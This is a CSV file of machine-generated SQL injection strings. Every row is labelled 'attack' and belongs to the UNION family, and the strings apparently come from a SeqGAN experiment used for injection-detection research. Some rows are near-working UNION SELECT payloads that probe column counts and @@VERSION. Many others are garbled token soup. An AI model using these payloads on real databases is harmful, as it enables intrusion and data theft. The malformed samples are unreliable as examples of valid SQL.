label,payload,family,payload_type,method,run_id,sample_index
attack,"1'  )     )    )    )    union union all all all all ,3059,7348,5756,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,264
attack," all select ,@9357,1249,1249',4266,9357,8986,6996,3059#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,265
attack,"-""  )   union all all select 3480,3480,3990,7845,3990,7348,48547348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,266
attack,-)  1401  )     )    a   )   )  )  )     union union select @s@$,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267
attack,-8073  )   union all select * from@N @,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268
attack,"-2190'  )   union all select ,null,4600,7348 93229322#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269
attack,"-8812%""    )    union all  all union from null,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270
attack,"1'  )  )    unionall select null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271
attack,"-'  )     )   )    )     )  )     )     )    union select null,null,9814--,7348,8665,3072,6996#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272
attack,"-6""  )     )     )  2088 union select null,4266,7497,4300,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273
attack,",-6667'  )   unione   =1  )    union all select 8268,1646,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274
attack,"-5575""  )    union all *  *<seers i'1'  (  I     =  select 9517,@i1  )    )    )    )    )   union 4266,9921,9921,7348,3072,7348,3990r,@@vers4600  )     as users id  =  all all all all all all from ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275
attack,"-)    S union all select from,9814,3072',3339,vers --,vers where il=  =  '1' union select 8665,,9110,8665,8123,5756,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276
attack,"-8812""  where 8890$ union all all select null,7497,9322,2446,7348,8123,8986,8123,9814,1441,3084,9814,7348,4300,8123,8123,null,8123,9988,5756,3072,9814,8123,1297,9814,8123,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277
attack,"-7531 =    =  \union$  ioselect null,4266,4266,4600#,4854,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278
attack,"-1401""""  )    )    union all all all all * 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279
attack,"-5131%""    )    )    )    8073  )    )   8890  =  =  1 4338 union select $@Vs@VEEVE3596er  )    )    )     )  wherea)    )    )     )    )    if=  =  )    as  union all all all all all 1,)N useh id  =  )    union all select 2446,5756,2446,8986,8986,7348,#,7348,5756,8665,4854--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280
attack,-6075'   )  )     )     )    )   union all select #,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281
attack," all select us @E&&i,1646--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282
attack,"-4542 union all all select 1297,2263,4300--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283
attack,13370' )   )    )     )    )    union  =  8268  2285 1646  N select )    5349s where  =  ( union all all 1--8772   N @,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284
attack,"-s union select null,1249,1249,1249,4909,6996,1249,4909",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285
attack,"-5945"" -- union all all --,7845,8986,'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286
attack,"t where  f-)  =  =  =  1 7815  1 union all all all select null,null,8123,4909,3990,9988,4854,7348,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287
attack,"all all select 8123,4266,4300,5756,8123--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,288
attack,"-4205''  )    )    union all all all * from$where @s,@@V",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,289
attack,"-1401""  )    )    union all select 1646,6996,9357,1134,6097rs id  1494    )     )    )     )     )     )    union all all select from,9814ers where  @$#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,290
attack,"-3990""s union 8268$' where   '1'  1 id  1 2011  1 union all all select where @,vrs -- from users id id  =  =  1 u  (   union all select @@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,291
attack,"-)4205 union all union all 1,1646,6996,1249,# null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,292
attack,"-4589 union null,1249,1249,1249"",ver,null,null --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,293
attack,"-5575""  )    )    union all all all 8268,1249'53496996  )    )  )  )   union all all all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,294
attack,"-3059'   )     )    )     )   e""  )    union all select 4854,4600,1441,5756,5756,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,295
attack,"-""  )    union all union null,2263,2263,9357,1297,3059,3059,3059,4266,1441,8986,4300null,1224,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,296
attack,-oaoowhere ers i  =  1 union all all * from  &&@,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,297
attack,"-""   as   =  1  '1'  )   union all from uers* where id  =  '1' 8268  ('eas where id  8268 or  =  ) union all select null,nullnull,9814,8123,7348,4909,3480,8123,8123,8986,2263,7348,7348,430069969814,4854,4854,9814,3072,3339,4300,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,298
attack,"-4373'+  (  select 'h union all 1,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,299
attack,"-'  )    )    a    )     )    )    union select 5756,1249,7845,9921,9921,1980,1441,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,300
attack,"-53498521')   union * 1494  =  '1' union all null,7845,1224,3059,8665,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,301
attack,-)    union all 1980+,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,302
attack,"1' $  )    )    j  )   union all all select null,4909,7348,7348,4266,1224,8123,1224,7348,3990,7348,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,303
attack,"-8521'  )    union id  =  '1' a1  @  )   union all select null,null,4300,4266,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,304
attack," -3781sunion * fromveid  )    )   union all select 1980,3480,4266,3072,3072,3084,9814,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,305
attack,-4373t union all @s where i1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,306
attack,"-v3084,9814er   )  )   )    b-- union  all  from where usersers versers id  '1'  $  =  78159517 union all select null,null,4300,1224,8123,1441,9357,8665,1249,5756,5756,9814,8123,5756,1224,4300,5756,9814,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,307
attack,"-    '+  (  select 'ers union select 7845,3990,6996,6996,6996--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,308
attack,"-""    )    union all * @1 users $s where  union @($,3072ers id  =  1980   * boo1  (    )    )    )    )    )   union all bs ion  (    )    )  )    union all all all 1,@@VEERSION ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,309
attack,-4542 union all all 11all all 1 users us where id  =  (  =  '1'  (    union all select  * 1494,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,310
attack,"-3997t' union all select null,4854,5756,null,4909,4854,7348,4266,4854,7348#--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,311
attack,"-4542 union all from where where ion users )     )    union all all all all all 2446,8986,@@@VEEERSION1249 where  )    )    )    )     )=  =  1 union all all all all all ,2285,9921,9921,2285,9921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,312
attack,"-5575'  )    )    union all select @VEEVRSIunionON  @ 1usis where  =  =  =  1 union all all select 3059,3059,9921,1297,1441,9921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,313
attack,"1'    )     )   )    )    union all select null,@,7348,4854,9921,1441,9921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,314
attack,"-6097'  )    )   union all 1494sion  (    )    )    )   =  '1'  1980 union all union from where,vers id  =  =  =  =  1 union all all all all all select from,1249@s,9357,7348,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,315
attack,-5131',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316
attack,"-""  )   )    )    union all select  from,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317
attack,"-9860'    s union all all 1980&&er  )    )     )all id  1494    union all * where userk where where   union all fromrsers in  (    )   union all null,--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318
attack,"-3116""  )    )    t'  )    3997   a  )     )    union all all select 1,1249 2263,@@  EEERSSION 1249ION us id  =  =  union 1'$  )   where i1 union 1494 where where usersid  =  =    20111 union all all * uo from @s where id  ,1224,9110,1249,3990IrN@srs 9357eus id  =  =  '1'  )     )     )    union all",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319
attack,"1'  )    )   union all all @ from gounion null,null,4300,null,null,7348,4854,7348,7348,8123,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320
attack,"6253 select  1,1249,1249,6996,' @@s@&&  I  8890s union us,@@VEVERSIO   e"" union all select 1ersersid  =  =  =        union select select @VEERS)    )    as union all ,7497,4300,4300,2263,5756,null,1441,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321
attack,"-""  )    )   union all all select null,9110,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,322
attack,"-,""  )    )    )     )   union all select 1,@@@VEVERSION er  )$  =  where union all 9517 all select from,@@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,323
attack,"-3378"" i  q  b where us users id  = b  =  )    )     )   union all * $ $ @'1'  ( 1646  =1917  =  1 union select  7497,2285,4600,1249,',1249,4266,1249,6996,1249,null,4266,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,324
attack,"-5945'  )    )     )    -- all select from,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,325
attack,"-8521)    )     )     )    )     )    )  =  2011  )  )    union select 7348,1249,7845,'@@VERSIONO    )   )  )     )  )   a  )    union   all all  null,4266,3072,1249,,3084",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,326
attack,"-2207' )   )    )    )    union all \O 8268  =  '1'  ) union all  * u us users where id  =  =  8268 u,vid  )    union all all all all 1,' )%",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,327
attack,"-4542  )   union all select from @sirs id  =  =  =  '1'  (    b)    )    union all all all * from,)    )ES    )    )     )    )     union all select 7845,3990,1249,@@VEERSION --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,328
attack,"-4205'  )  )    )    union all 1980 -- select 2263,3059,2446,1297#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,329
attack,"-5575""  )   as'  =  7815  2011 2011  )    union all all 2571 1980  )     )   union all select 8665,null,1441,4854,7348,7348,1646--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,330
attack,"-6097'+""  )    )   union all all select ,2263",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,331
attack,"-9357')   )   union all all all 8665,8986,6737,7845,4909,7348,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,332
attack,"-9156'  )    )     )    )    union $ from us$=sers id    =  '1'8268$ union 1 union  $ion  (    )    )   -- 1'  (ver   )    )    )    union all select ,@V&&e#ViVser  =  )     )    )    union 22851  =  =  =  select usrs us id  =  1 union all $,-- users union null,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,333
attack,"-5756""  )    )    where  ver2011  )     )    ""  )    )     )   union all all all select ,null,8986,4909,7348,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,334
attack,"-2639""  )    )     )    union all all all $ from@us @ usver  =  $  =  =  $""  =  )     )    union all  select ,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,335
attack,"-8812""  )    )    where . union all select @@VEEERSION -- or   1  )    union  &&#VE)    )    )   union select 2263,5756,7348,8986e,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,336
attack,"-`'   )    )     )    union all select null,null,null,null,null,null,null##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,337
attack,"-4542 where   1   1 union all all select null,null,null,2263#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,338
attack,"-  d  =  =  1 union all all 11646,9110,@@VEEVsig$$   =  =  1 .    )   union all all select @s 2571",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,339
attack,"-8812%'  )    union3059 union select @,8986E,vers id  =  '1' select 3339s users  =  =    SIO union all all all select from null,@@VEERSION users i usi=  )  )  =  1 union all all * .",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,340
attack,"-1894""  )   )     )     )    union all all all 1,versin  (  )    )    )    where *  =  1646  <+t +$  =  union all all select 1,9322,v@s io1'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,341
attack,"-7497'  =  )    -- select select @=sid  )   union all select 1224,7348,7348,7348,5756,9988##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,342
attack,"1'  )    )    as union all all select ,4266#s#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,343
attack,"-'  )   union all 9814,3059,7348,4854,7348,4854--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,344
attack,1'   h  )    union all all 1--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,345
attack,"-4373union all from where id  =  (4338   '1' unionall all select all,all,4300,4300,2446#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,346
attack,"-4589""  )    )    )    union select all ,3059,3990,8986,8123,4266,8123,7348,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,347
attack,"-6667%'  )   union all all all select 1,vers -- from useis   =  (    union union all 1,vers,@@@VEERSIION u  )    as  =  '+  (  select 'lh  '1' union from ers id  =  (     )     )   union all where select 1980,9110,v,9814",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,348
attack,"-'  )    )    union all all all select 9322,2263,4854,8123#,null,7348,5756,4854,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,349
attack,-7531)   union all all all all  from,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,350
attack,"--,,1249,8986,9110),7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,351
attack,"-4373.    )    )     )    )  union all select @EEEI$,1980,@@ usid  )    ""  =  )    )    )    )    union all all 2263,6737,9921,3990,7348,7348,8665,1297,7348,8986,1441,9988'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,352
attack,"-1401's union all  select null,null,null,4266,7497E--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,353
attack,"-4205'   )  (     )     )   union all all all select null,null,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,354
attack,"1'   )    )   union all all all all  from$,5349,8986',9357#,1249,3072,vm,4966s,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,355
attack,"-8812""  )     )    )     )     )     )    union all all union all 4266,4266,3072,4266--O,3072,null,1297,7348,7348,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,356
attack,"1""  )    )   union all all select null,9322,9988,9921,4300,8123,9814,1224,8123,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,357
attack,"-1401""   )   )    )     )'   )    )   where union 2011  '1'  '1'9860 union all   union all select null,4909--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,358
attack,"-X'' 91101980  = h+  8268 union all all $ from @s us its fromers id  =  && union all null,6737,4300,null,null,null,9814#,1224,1441,8123,8123,8123,8123,8123,7348,9814,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,359
attack,"-8521 union 1 union 4266,9921,1980--,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,360
attack,-6996'  )    (    union all select * @@s users id  =  1   select from us#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,361
attack,"-3781%'  )     )     )     )    )    a)    union    select from, null,9814,3084,3997#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,362
attack,"-""  )     )     )     )    )     )    union all all = . union all all 2088 union 1@@2088sions  )  )  (    union all all select null,1441,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,363
attack,"-5945' union all all select,',1297,6996,1249,'    e)    ),vers@  =  ( union i f&&eersid  = union all all all all all null,4600,3059#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,364
attack,"-5575""   )    )    )    union all all all all * from--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,365
attack,"-6253 union all where select @V)   where @@VERSION -- from  e#1 us union all all 1,ers id  =  '1'  1 union all all all select all @VRSIunion select ,2263,8665,7348,8123,7348,null,7348null,4854,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,366
attack,"-43732639""   )    )    )     )   union all  1917  ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,367
attack,"-1401""  )    )    af)     )    )   union all all all * from where ioi1  =  n  (    )   )   -- uon  s  =  1  )  1646  )   union iselect * 4338,@@s-- @VERSSIO9517     )    )     )   union all all all select null,4300,8123,8123,5756,8123,3072,5756,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,368
attack,"-3997  I    )    )    )    union all all select @s uers i,n isers union all from where i  ,9357,9988,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,369
attack,"-8812""  )    )   union all select @1ers u  =  =  =  =  (    union select @,1297,2263,3990,1249,3480,6737,1646,6737#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,370
attack,"-9110""  )   )    )    where 2774  =  '1'  =  1  union all from ,6996,1249,'#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,371
attack,"-4589""  )   union all null,null,null,9814#8986r,9110s,null,null,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,372
attack,"-3370""  )    )   union all  from users@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,373
attack,"-5131'  )     )     )   union all all null,null,1249,3084,3072,',1646,1249'srs i--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,374
attack,-3781'  )    )   union from 5349O,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,375
attack,"-3339""  )    )   union all all 1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,376
attack,"-3480'  )    )     )     )    unionv)    union all select 9322,,1646,9322#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,377
attack,-6075',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,378
attack,"-,'  )   )     )     )    )    union all select null,6996,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,379
attack,"-3879'  )   union select from ersio @s@VEE-- select3480,v,vers@(SIONser&&--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,380
attack,"-'  )   )    )   union all select null,3480,7348,8123,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,381
attack,"-)     )   union all all select null,null',9921,3480,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,382
attack,"-4330' union all select from users )   where  =  )    )     )   union 1646@  =  =  =  '1'  where  2285  = union $ $ id  =  =  8268  )    union select 2263,3990,1249 ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,383
attack,"-3378""  )%'    )   )    )    )     a+a  )    union select 1,2263,1249,1249,9921,4481#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,384
attack,"-""  ='  )N    )   union select null,5756--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,385
attack,"-%""  )   union all all null,2446,1441,1441,1441,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,386
attack,"-3997   )    )     )    )    )   union select @$,vers usid  =  an  (    )    O'     )    )     )    a)   union all 8890 7348,'@$ where  =.,@)sers SI   =  ( )   union 2285 or from  =  '1' \2774  =  )  2088$ union all select @,9921,1297,3480,6996,,1249,7497,vs    ers idid  =  '1'  8268  4338' union all all from us$",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,387
attack,"-3378'  )    )   union select  =s@&&where @V)   where5349)<-- from i  =  1 us all select all from @,@ @EEwhere id  1 union all select null,8665#,,4854,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,388
attack,"-3997  )    union all all userts where  ns select 7497ussers id  =  $ 2088  =  1 union all 2285,null,4266,4600,7348,7348,4909,9814,7348,7348,7348,5756,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,389
attack,"-1494union from where ers iod  =  =  =  =  '1'  4338   union all all select 4300,null,4300,null,8123,1297#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,390
attack,"1' union select  from)    ) id  =  1 union  all * $$ 1646  =  ),vVEEg  )    )    )     )    where * from  =  1 union all all select select V--,@@VERSION' union 1 usas where id  1 union all from 1646,1249 --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,391
attack,"-""  )  )   union all select 8123,9814,1249,4300,7348,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,392
